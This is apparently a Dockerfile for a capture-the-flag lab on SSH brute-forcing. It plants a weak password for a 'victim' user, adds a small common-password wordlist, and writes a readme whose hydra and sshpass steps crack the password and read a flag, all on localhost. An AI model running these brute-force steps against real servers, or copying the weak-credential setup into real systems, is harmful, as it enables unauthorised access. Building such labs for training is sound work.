FROM ubuntu:22.04

RUN apt-get update && apt-get install -y openssh-server hydra sshpass sudo && rm -rf /var/lib/apt/lists/*

RUN useradd -m -s /bin/bash attacker && \
    useradd -m -s /bin/bash victim && \
    echo "victim:letmein" | chpasswd

RUN mkdir -p /var/run/sshd && \
    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config && \
    echo "PermitRootLogin no" >> /etc/ssh/sshd_config && \
    ssh-keygen -A

RUN echo "FLAG{ssh_brut3_f0rc3_0wn3d}" > /home/victim/flag.txt && \
    chown victim:victim /home/victim/flag.txt && \
    chmod 600 /home/victim/flag.txt

RUN echo "attacker ALL=(root) NOPASSWD: /usr/sbin/sshd" > /etc/sudoers.d/attacker && \
    chmod 440 /etc/sudoers.d/attacker

RUN printf 'admin\npassword\nletmein\n123456\nroot\npassword1\nqwerty\npass\nlogin\nwelcome\niloveyou\ndragon\nmaster\nabc123\nmonkey\n' \
    > /home/attacker/wordlist.txt && chown attacker:attacker /home/attacker/wordlist.txt

RUN printf 'SSH Brute Force Lab\n===================\nA user "victim" has set a weak SSH password.\nThe SSH server is running on localhost (127.0.0.1).\n\nStep 1 - Start the SSH service:\n  sudo /usr/sbin/sshd\n\nStep 2 - Brute force with hydra:\n  hydra -l victim -P ~/wordlist.txt ssh://127.0.0.1 -t 4\n\nStep 3 - SSH in and read the flag:\n  sshpass -p <FOUND_PASSWORD> ssh -o StrictHostKeyChecking=no victim@127.0.0.1 cat flag.txt\n' \
    > /home/attacker/readme.txt && chown attacker:attacker /home/attacker/readme.txt

WORKDIR /home/attacker
USER attacker
CMD ["/bin/bash"]
